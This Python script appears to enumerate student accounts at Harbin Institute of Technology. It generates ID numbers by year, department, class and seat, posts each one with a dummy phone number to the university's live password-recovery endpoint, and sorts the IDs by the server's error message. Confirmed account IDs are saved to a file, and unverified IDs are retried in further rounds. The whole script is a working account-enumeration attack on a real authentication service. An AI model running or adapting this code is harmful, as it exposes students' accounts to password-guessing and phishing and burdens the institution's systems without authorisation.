# -*- coding: utf-8 -*-

"""
global：
    peo:第一位数字1 鬼知道啥意思,list
    year:入学年份,list
    yuan:院系代号,list
    ban:班级,list
    num:班级内学号,list
    faild:不存在的学号,list
    err:一轮验证中未验证的学号,list
function:
    createXH():
        无输入
        返回生成的学号列表,list
    verifyID(ids):
        输入待验证的学号列表,list
        返回有效的学号列表,list
        更新faild和err
"""

import urllib
import urllib.request
# import time

# 1  -16  -050 -07 -14
# peo-year-yuan-ban-num
peo = ['1']
year = ['17']
yuan = ['050']
ban = [str(x).zfill(2) for x in range(1, 21)]
num = [str(x).zfill(2) for x in range(1, 36)]

# result
faild = []  # tan90 xh
err = []


def createXH():
    # return ['1160500714']
    # return [input('Input xh:')]
    return [a + b + c + d + e for a in peo for b in year for c in yuan for d in ban for e in num]


def verifyID(ids):
    res = []
    global err
    err = []
    url = 'http://ids.hit.edu.cn/authserver/getBackPasswordByMobile.do?service=http%3A%2F%2Fids.hit.edu.cn%2Fauthserver%2Fservices%2Fj_spring_cas_security_check'
    cookie = ''
    # cookie = input('Input cookie:')
    header = {'Cookie': cookie}
    for xh in ids:
        postdata = 'map%5B%27uid%27%5D={}&map%5B%27mobile%27%5D=11111111111&_target1='.format(xh)
        postdata = postdata.encode('utf-8')
        req = urllib.request.Request(url, postdata, header)
        r = urllib.request.urlopen(req)
        while r.getheader('Set-Cookie') is not None:
            # print('cookie失效，当前学号: %s' % xh)
            cookie = r.getheader('Set-Cookie')[:-8]
            cookie = cookie[:38] + ';' + cookie[39:]
            # print('新cookie: %s' % cookie)
            header = {'Cookie': cookie}
            req = urllib.request.Request(url, postdata, header)
            r = urllib.request.urlopen(req)
        # time.sleep(0.6)
        try:
            data = r.read()
            if data.decode('utf-8', errors='ignore').find('输入的用户名不存在') != -1:
                faild.append(xh)
                # print('{} isn\'t exist'.format(xh))
            elif data.decode('utf-8', errors='ignore').find('输入的手机号码不正确') != -1:
                res.append(xh)
                # print('{} is valid'.format(xh))
            else:
                err.append(xh)
                # print('{} 未验证'.format(xh))
        except:
            err.append(xh)
            # print('{} 未验证'.format(xh))
    return res


def Test(c):
    # a = input('peo:')
    # b = input('year:')
    # c = input('yuan:')
    # d = input('ban:')
    # e = input('num:')
    global peo, year, yuan, ban, num
    # peo = [a]
    # year = [b]
    yuan = [c]
    # ban = [str(x).zfill(2) for x in range(1, 1 + int(d))]
    # num = [str(x).zfill(2) for x in range(1, 1 + int(e))]

    xh = createXH()
    print('待验证学号(%s)：' % len(xh), xh)
    validIds = verifyID(xh)
    print('第一轮验证完成')
    print('err(%s): ' % len(err), err)
    while len(err) != 0:
        print('上一轮有学号未验证，开始下一轮验证：')
        xh = err
        tmp = verifyID(xh)
        validIds.extend(tmp)
        print('本轮验证完成')
        print('err(%s): ' % len(err), err)
    validIds.sort()
    faild.sort()
    print('\nvalidIds(%s): ' % len(validIds), validIds)
    print('tan90(%s): ' % len(faild), faild)
    filepath = '.\\ver_116' + c + '.txt'
    with open(filepath, 'w') as f:
        for c in validIds:
            f.write(c + '\n')
    print('validIds已写入' + filepath)


if __name__ == '__main__':
    a = ['050']
    for c in a:
        Test(c)